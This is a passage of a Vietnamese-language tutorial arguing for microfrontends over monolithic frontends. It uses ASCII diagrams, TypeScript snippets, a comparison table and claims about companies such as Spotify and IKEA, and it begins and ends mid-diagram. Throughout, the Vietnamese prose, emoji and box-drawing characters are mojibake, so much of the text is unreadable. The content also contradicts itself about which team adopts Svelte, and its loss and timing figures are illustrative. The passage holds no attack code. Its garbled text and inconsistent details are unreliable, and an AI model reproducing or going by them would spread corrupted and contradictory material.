â”‚  â”œâ”€ 10:00 AM: Team A commit fix                         â”‚
â”‚  â”œâ”€ 10:20 AM: Build xong (20 phÃºt)                      â”‚
â”‚  â”œâ”€ 01:00 PM: QA test xong (2h 40 phÃºt)                 â”‚
â”‚  â”œâ”€ 02:00 PM: Deploy production                         â”‚
â”‚  â””â”€ 02:30 PM: Rollback vÃ¬ bug tá»« Team C! âŒ             â”‚
â”‚                                                           â”‚
â”‚  â±ï¸ Tá»•ng: 4.5 giá» cho 1 thay Ä‘á»•i nhá»!                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âŒ Váº¥n Äá» 2: TEAM CONFLICTS (Xung Äá»™t Giá»¯a Teams)**

```typescript
// âŒ Team A: Muá»‘n dÃ¹ng React 18 + TypeScript strict
// âŒ Team B: Váº«n Ä‘ang dÃ¹ng React 17 (legacy code)
// âŒ Team C: Muá»‘n thá»­ Svelte cho performance
// âŒ Team D: Muá»‘n migrate tá»« Redux â†’ Zustand

// Káº¿t quáº£: KHÃ”NG AI ÄÆ¯á»¢C LÃ€M GÃŒ Cáº¢!
// â†’ Pháº£i há»p 6 teams Ä‘á»ƒ Ä‘á»“ng Ã½ 1 quyáº¿t Ä‘á»‹nh
// â†’ Máº¥t 2-3 tuáº§n chá»‰ Ä‘á»ƒ quyáº¿t Ä‘á»‹nh upgrade React
// â†’ Team C khÃ´ng Ä‘Æ°á»£c dÃ¹ng Svelte â†’ frustrated â†’ nghá»‰ viá»‡c ğŸ˜¢
```

**âŒ Váº¥n Äá» 3: SLOW BUILD TIME (Build Cháº­m)**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              BUILD TIME COMPARISON                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                           â”‚
â”‚  MONOLITHIC (1 app lá»›n):                                 â”‚
â”‚  â”œâ”€ npm install: 8-10 phÃºt (500 dependencies)           â”‚
â”‚  â”œâ”€ Build: 15-20 phÃºt                                    â”‚
â”‚  â”œâ”€ Hot reload: 5-10 giÃ¢y (cháº­m!)                       â”‚
â”‚  â””â”€ Dev server start: 2-3 phÃºt                          â”‚
â”‚                                                           â”‚
â”‚  â±ï¸ Developer experience: Ráº¤T Tá»†!                        â”‚
â”‚  ğŸ˜¢ Devs pháº£i Ä‘á»£i 10s má»—i láº§n save code                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âŒ Váº¥n Äá» 4: MERGE CONFLICTS (Xung Äá»™t Merge)**

```bash
# Team A, B, C, D, E, F cÃ¹ng lÃ m viá»‡c trÃªn 1 repo

# Monday morning:
git pull origin main
# âŒ Conflict in package.json (6 teams cÃ¹ng add dependencies)
# âŒ Conflict in webpack.config.js (3 teams cÃ¹ng config)
# âŒ Conflict in tsconfig.json (2 teams cÃ¹ng thay Ä‘á»•i)

# Developer pháº£i máº¥t 30-60 phÃºt giáº£i quyáº¿t conflicts TRÆ¯á»šC KHI code! ğŸ˜¢
```

**âŒ Váº¥n Äá» 5: SINGLE POINT OF FAILURE (Äiá»ƒm Lá»—i Duy Nháº¥t)**

```typescript
// Team C viáº¿t code cÃ³ bug trong Checkout module

function calculateTax(amount: number): number {
  return amount * undefined; // âŒ BUG! Undefined reference
}

// Káº¿t quáº£:
// âŒ TOÃ€N Bá»˜ app crash (white screen)! 
// âŒ ProductCatalog cá»§a Team A: DOWN âŒ
// âŒ ShoppingCart cá»§a Team B: DOWN âŒ
// âŒ UserProfile cá»§a Team D: DOWN âŒ
// âŒ AdminDashboard cá»§a Team F: DOWN âŒ

// ğŸ’¸ Loss: $100,000/hour vÃ¬ website down!
```

**âŒ Váº¥n Äá» 6: HARD TO SCALE TEAMS (KhÃ³ Má»Ÿ Rá»™ng Team)**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         MONOLITHIC TEAM SCALING PROBLEM                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                           â”‚
â”‚  Khi team tÄƒng tá»« 10 â†’ 50 developers:                   â”‚
â”‚                                                           â”‚
â”‚  âŒ Code review CHáº¬M (pháº£i review toÃ n bá»™ codebase)     â”‚
â”‚  âŒ Merge conflicts tÄƒng theo cáº¥p sá»‘ nhÃ¢n                â”‚
â”‚  âŒ Communication overhead (50 devs pháº£i sync)           â”‚
â”‚  âŒ Onboarding má»›i Máº¤T 2-3 THÃNG (codebase quÃ¡ lá»›n)     â”‚
â”‚  âŒ "Ai viáº¿t code nÃ y?" â†’ KhÃ´ng ai biáº¿t ğŸ˜…              â”‚
â”‚                                                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

**âœ… Microfrontend Giáº£i Quyáº¿t NhÆ° Tháº¿ NÃ o? (The Solution)**

```typescript
// ===================================================
// âœ… MICROFRONTEND - CÃ™NG VÃ Dá»¤ NHÆ¯NG ÄÆ¯á»¢C Tá»” CHá»¨C Láº I
// ===================================================

ğŸ“¦ ecommerce-monorepo/
â”œâ”€â”€ apps/
â”‚   â”œâ”€â”€ shell/                   â† Team Platform (2 devs)
â”‚   â”‚   â””â”€â”€ Deploy: RiÃªng biá»‡t   â† Build 2 phÃºt, Deploy Ä‘á»™c láº­p
â”‚   â”‚
â”‚   â”œâ”€â”€ product-catalog/         â† Team A (10 devs)
â”‚   â”‚   â”œâ”€â”€ package.json         â† React 18 âœ…
â”‚   â”‚   â””â”€â”€ Deploy: RiÃªng biá»‡t   â† Build 3 phÃºt, Deploy Ä‘á»™c láº­p
â”‚   â”‚
â”‚   â”œâ”€â”€ shopping-cart/           â† Team B (8 devs)
â”‚   â”‚   â”œâ”€â”€ package.json         â† React 17 (legacy) âœ…
â”‚   â”‚   â””â”€â”€ Deploy: RiÃªng biá»‡t   â† Build 2 phÃºt, Deploy Ä‘á»™c láº­p
â”‚   â”‚
â”‚   â”œâ”€â”€ checkout/                â† Team C (12 devs)
â”‚   â”‚   â”œâ”€â”€ package.json         â† Zustand âœ…
â”‚   â”‚   â””â”€â”€ Deploy: RiÃªng biá»‡t   â† Build 4 phÃºt, Deploy Ä‘á»™c láº­p
â”‚   â”‚
â”‚   â”œâ”€â”€ user-profile/            â† Team D (6 devs)
â”‚   â”‚   â”œâ”€â”€ package.json         â† Vue 3 âœ… (khÃ¡c framework!)
â”‚   â”‚   â””â”€â”€ Deploy: RiÃªng biá»‡t   â† Build 2 phÃºt, Deploy Ä‘á»™c láº­p
â”‚   â”‚
â”‚   â”œâ”€â”€ order-history/           â† Team E (5 devs)
â”‚   â”‚   â”œâ”€â”€ package.json         â† Angular âœ… (khÃ¡c framework!)
â”‚   â”‚   â””â”€â”€ Deploy: RiÃªng biá»‡t   â† Build 3 phÃºt, Deploy Ä‘á»™c láº­p
â”‚   â”‚
â”‚   â””â”€â”€ admin-dashboard/         â† Team F (8 devs)
â”‚       â”œâ”€â”€ package.json         â† Svelte âœ… (khÃ¡c framework!)
â”‚       â””â”€â”€ Deploy: RiÃªng biá»‡t   â† Build 1 phÃºt, Deploy Ä‘á»™c láº­p
```

**âœ… Lá»£i Ãch 1: INDEPENDENT DEPLOYMENT (Deploy Äá»™c Láº­p)**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         MICROFRONTEND DEPLOYMENT - HEAVEN!                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                           â”‚
â”‚  Team A fix bug trong ProductCatalog (1 dÃ²ng code)       â”‚
â”‚              â†“                                            â”‚
â”‚  âœ… Build CHá»ˆ product-catalog app (3 phÃºt)              â”‚
â”‚  âœ… Test CHá»ˆ product-catalog (30 phÃºt)                  â”‚
â”‚  âœ… Deploy CHá»ˆ product-catalog â†’ KHÃ”NG áº£nh hÆ°á»Ÿng teams khÃ¡c! â”‚
â”‚  âœ… Náº¿u cÃ³ bug â†’ CHá»ˆ product-catalog affected           â”‚
â”‚                                                           â”‚
â”‚  Timeline:                                                â”‚
â”‚  â”œâ”€ 10:00 AM: Team A commit fix                         â”‚
â”‚  â”œâ”€ 10:03 AM: Build xong (3 phÃºt) âš¡                     â”‚
â”‚  â”œâ”€ 10:30 AM: QA test xong (27 phÃºt)                    â”‚
â”‚  â””â”€ 10:35 AM: Deploy production âœ…                       â”‚
â”‚                                                           â”‚
â”‚  â±ï¸ Tá»•ng: 35 phÃºt cho 1 thay Ä‘á»•i! (vs 4.5 giá» trÆ°á»›c)   â”‚
â”‚                                                           â”‚
â”‚  ğŸš€ Team B, C, D, E, F váº«n deploy bÃ¬nh thÆ°á»ng!          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âœ… Lá»£i Ãch 2: TEAM AUTONOMY (Tá»± Chá»§ Team)**

```typescript
// âœ… Team A: DÃ¹ng React 18 + TypeScript strict âœ…
// âœ… Team B: Váº«n dÃ¹ng React 17 (ko ai care) âœ…
// âœ… Team C: DÃ¹ng Zustand thay Redux âœ…
// âœ… Team D: DÃ¹ng Vue 3 âœ…
// âœ… Team E: DÃ¹ng Angular âœ…
// âœ… Team F: DÃ¹ng Svelte cho performance âœ…

// Káº¿t quáº£: Táº¤T Cáº¢ Äá»€U HÃ€I LÃ’NG! ğŸ‰
// â†’ Má»—i team tá»± quyáº¿t Ä‘á»‹nh tech stack
// â†’ KhÃ´ng cáº§n há»p 6 teams
// â†’ Team C Ä‘Æ°á»£c dÃ¹ng Svelte â†’ happy â†’ stay with company ğŸ˜Š
```

**âœ… Lá»£i Ãch 3: FAST BUILD TIME (Build Nhanh)**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              BUILD TIME - MICROFRONTEND                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                           â”‚
â”‚  MICROFRONTEND (nhiá»u apps nhá»):                         â”‚
â”‚  â”œâ”€ npm install: 1-2 phÃºt (50 dependencies má»—i app)     â”‚
â”‚  â”œâ”€ Build: 2-4 phÃºt (chá»‰ build app Ä‘ang lÃ m)           â”‚
â”‚  â”œâ”€ Hot reload: <1 giÃ¢y âš¡                              â”‚
â”‚  â””â”€ Dev server start: 10-20 giÃ¢y                        â”‚
â”‚                                                           â”‚
â”‚  â±ï¸ Developer experience: TUYá»†T Vá»œI!                     â”‚
â”‚  ğŸ˜Š Devs tháº¥y changes NGAY Láº¬P Tá»¨C                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âœ… Lá»£i Ãch 4: NO MERGE CONFLICTS (KhÃ´ng Xung Äá»™t)**

```bash
# Team A lÃ m viá»‡c trÃªn apps/product-catalog/
# Team B lÃ m viá»‡c trÃªn apps/shopping-cart/
# Team C lÃ m viá»‡c trÃªn apps/checkout/

# Monday morning:
git pull origin main
# âœ… NO CONFLICTS! (Má»—i team lÃ m folder riÃªng)
# âœ… package.json riÃªng biá»‡t
# âœ… webpack.config.js riÃªng biá»‡t

# Developer cÃ³ thá»ƒ code NGAY! ğŸš€
```

**âœ… Lá»£i Ãch 5: ISOLATED FAILURES (Lá»—i CÃ´ Láº­p)**

```typescript
// Team C viáº¿t code cÃ³ bug trong Checkout module

function calculateTax(amount: number): number {
  return amount * undefined; // âŒ BUG! Undefined reference
}

// Káº¿t quáº£ vá»›i Microfrontend:
// âœ… CHá»ˆ Checkout app crash (cÃ³ Error Boundary)
// âœ… ProductCatalog cá»§a Team A: VáºªN HOáº T Äá»˜NG âœ…
// âœ… ShoppingCart cá»§a Team B: VáºªN HOáº T Äá»˜NG âœ…
// âœ… UserProfile cá»§a Team D: VáºªN HOáº T Äá»˜NG âœ…
// âœ… AdminDashboard cá»§a Team F: VáºªN HOáº T Äá»˜NG âœ…

// ğŸ’¸ Loss: $10,000/hour (chá»‰ checkout down, cÃ²n láº¡i OK)
// ğŸ“‰ 90% giáº£m loss so vá»›i Monolithic!
```

**âœ… Lá»£i Ãch 6: EASY TO SCALE TEAMS (Dá»… Má»Ÿ Rá»™ng)**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         MICROFRONTEND TEAM SCALING - SMOOTH               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                           â”‚
â”‚  Khi team tÄƒng tá»« 10 â†’ 50 developers:                   â”‚
â”‚                                                           â”‚
â”‚  âœ… Má»—i team cÃ³ codebase riÃªng (dá»… review)              â”‚
â”‚  âœ… NO merge conflicts                                   â”‚
â”‚  âœ… Teams lÃ m viá»‡c parallel (khÃ´ng chá» Ä‘á»£i)             â”‚
â”‚  âœ… Onboarding Má»šI CHá»ˆ 1-2 TUáº¦N (codebase nhá»)          â”‚
â”‚  âœ… Team ownership rÃµ rÃ ng (Team A owns Catalog)        â”‚
â”‚                                                           â”‚
â”‚  ğŸš€ CÃ³ thá»ƒ scale Ä‘áº¿n 100-200 developers!                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âœ… Lá»£i Ãch 7: INCREMENTAL MIGRATION (Di Chuyá»ƒn Tá»«ng BÆ°á»›c)**

```typescript
// ===================================================
// ğŸ“¦ VÃ Dá»¤: Migrate tá»« Angular (legacy) â†’ React
// ===================================================

// âŒ MONOLITHIC: Pháº£i rewrite TOÃ€N Bá»˜ app cÃ¹ng lÃºc
// â†’ Máº¥t 1-2 nÄƒm, risk CAá»° CAO! ğŸ˜±

// âœ… MICROFRONTEND: Migrate tá»«ng module
// â†’ Máº¥t 3-6 thÃ¡ng, risk THáº¤P! ğŸ˜Š

// PLAN:
// â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
// â”‚  Month 1-2: Migrate ProductCatalog â†’ React â”‚
// â”‚  Month 3-4: Migrate ShoppingCart â†’ React   â”‚
// â”‚  Month 5-6: Migrate Checkout â†’ React       â”‚
// â”‚  Month 7-8: Migrate UserProfile â†’ React    â”‚
// â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

// Trong khi migrate:
// âœ… Angular modules VáºªN HOáº T Äá»˜NG
// âœ… React modules ÄANG ÄÆ¯á»¢C PHÃT TRIá»‚N
// âœ… Users KHÃ”NG Bá»Š GIÃN ÄOáº N
```

**âœ… Lá»£i Ãch 8: A/B TESTING & FEATURE FLAGS**

```typescript
// ===================================================
// ğŸ§ª A/B TESTING vá»›i Microfrontend
// ===================================================

// Shell app quyáº¿t Ä‘á»‹nh load version nÃ o

function App() {
  const userGroup = useABTest('checkout-v2'); // 50% users
  
  return (
    <div>
      {userGroup === 'A' 
        ? <CheckoutV1 /> // âœ… Version cÅ© (á»•n Ä‘á»‹nh)
        : <CheckoutV2 /> // âœ… Version má»›i (thá»­ nghiá»‡m)
      }
    </div>
  );
}

// âœ… Náº¿u V2 tá»‘t hÆ¡n â†’ Deploy 100% users
// âœ… Náº¿u V2 cÃ³ bug â†’ Rollback CHá»ˆ Checkout (khÃ´ng áº£nh hÆ°á»Ÿng apps khÃ¡c)
```

---

**ğŸ“Š So SÃ¡nh Tá»•ng Quan (Overall Comparison)**

| TiÃªu ChÃ­                | Monolithic                  | Microfrontend              |
| ----------------------- | --------------------------- | -------------------------- |
| **Deployment Time**     | 4-6 giá» âŒ                  | 30-60 phÃºt âœ…              |
| **Build Time**          | 15-20 phÃºt âŒ               | 2-4 phÃºt âœ…                |
| **Hot Reload**          | 5-10 giÃ¢y âŒ                | <1 giÃ¢y âœ…                 |
| **Team Conflicts**      | Cao (merge hell) âŒ         | Tháº¥p (isolated) âœ…         |
| **Tech Stack**          | 1 stack cho táº¥t cáº£ âŒ       | Má»—i team tá»± chá»n âœ…        |
| **Risk khi Deploy**     | Cao (toÃ n bá»™ app) âŒ        | Tháº¥p (1 module) âœ…         |
| **Failure Impact**      | ToÃ n bá»™ app down âŒ         | 1 module down âœ…           |
| **Team Scalability**    | KhÃ³ (>20 devs) âŒ           | Dá»… (100+ devs) âœ…          |
| **Onboarding Time**     | 2-3 thÃ¡ng âŒ                | 1-2 tuáº§n âœ…                |
| **Migration**           | Big bang (risk cao) âŒ      | Incremental (risk tháº¥p) âœ… |
| **A/B Testing**         | KhÃ³ âŒ                      | Dá»… âœ…                      |
| **Bundle Size**         | Lá»›n (load táº¥t cáº£) âŒ        | Nhá» (lazy load) âœ…         |

---

**ğŸ¯ Khi NÃ o NÃŠN DÃ¹ng Microfrontend?**

âœ… **NÃŠN dÃ¹ng khi:**
- âœ… Team > 20 developers
- âœ… App cÃ³ nhiá»u domains khÃ¡c nhau (catalog, cart, checkout, profile, admin)
- âœ… Muá»‘n deploy Ä‘á»™c láº­p tá»«ng pháº§n
- âœ… Muá»‘n dÃ¹ng nhiá»u tech stack (React + Vue + Angular)
- âœ… Legacy migration (Angular â†’ React tá»«ng bÆ°á»›c)
- âœ… Cáº§n A/B testing nhiá»u

âŒ **KHÃ”NG NÃŠN dÃ¹ng khi:**
- âŒ Team < 10 developers (overhead lá»›n)
- âŒ App Ä‘Æ¡n giáº£n (1-2 pages)
- âŒ KhÃ´ng cáº§n deploy Ä‘á»™c láº­p
- âŒ Chá»‰ dÃ¹ng 1 framework
- âŒ Startup giai Ä‘oáº¡n Ä‘áº§u (chÆ°a cáº§n scale)

---

**ğŸ’¡ Real-World Examples (VÃ­ Dá»¥ Thá»±c Táº¿)**

```
ğŸ¢ **Spotify**: 
   - Home, Search, Playlist, Player lÃ  cÃ¡c micro apps riÃªng
   - Deploy riÃªng biá»‡t 50+ láº§n/ngÃ y
   - Teams Ä‘á»™c láº­p (Squad model)

ğŸ¢ **Zalando**: 
   - Product listing, Cart, Checkout, Account lÃ  micro apps
   - 200+ developers lÃ m viá»‡c parallel
   - Tech stack: React, Vue, Angular cÃ¹ng tá»“n táº¡i

ğŸ¢ **IKEA**: 
   - Migrate tá»« .NET â†’ React incrementally
   - 10+ micro apps Ä‘á»™c láº­p
   - Giáº£m deployment time tá»« 6 giá» â†’ 30 phÃºt

ğŸ¢ **Amazon**: 
   - Má»—i product category lÃ  1 micro app
   - 1000+ developers
   - Deploy hÃ ng trÄƒm láº§n/ngÃ y
```

---

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  MONOLITHIC FRONTEND                     â”‚
â”‚                  (Kiáº¿n trÃºc cÅ© - 1 khá»‘i)                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                          â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚   â”‚         Entire App (React)                   â”‚      â”‚
â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚      â”‚
â”‚   â”‚  â”‚  Header  â”‚Dashboard â”‚   Profile    â”‚     â”‚      â”‚
â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚      â”‚
â”‚   â”‚                                              â”‚      â”‚
â”‚   â”‚  - 1 codebase                               â”‚      â”‚
â”‚   â”‚  - 1 deployment                             â”‚      â”‚
â”‚   â”‚  - 1 team pháº£i maintain táº¥t cáº£              â”‚      â”‚
â”‚   â”‚  - Deploy táº¥t cáº£ má»—i láº§n thay Ä‘á»•i nhá»      â”‚      â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

                          â†“ CHUYá»‚N Äá»”I

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              MICROFRONTEND ARCHITECTURE                  â”‚
â”‚              (Kiáº¿n trÃºc má»›i - Nhiá»u khá»‘i nhá»)           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚  Shell App     â”‚  â”‚  Remote Apps   â”‚                â”‚
â”‚  â”‚  (Host/Container)â”‚ â”‚  (Micro Apps) â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â”‚                                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚
â”‚  â”‚           Shell (React) - Team Platform     â”‚        â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚        â”‚
â”‚  â”‚  â”‚         Shared Header/Footer          â”‚   â”‚        â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚        â”‚
â”‚  â”‚                                              â”‚        â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚        â”‚
â”‚  â”‚  â”‚Dashboardâ”‚  â”‚ Profile  â”‚  â”‚  Orders  â”‚  â”‚        â”‚
â”‚  â”‚  â”‚ (React) â”‚  â”‚  (Vue)   â”‚  â”‚(Angular) â”‚  â”‚        â”‚
â”‚  â”‚  â”‚ Team A  â”‚  â”‚  Team B  â”‚  â”‚  Team C  â”‚  â”‚        â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚        â”‚
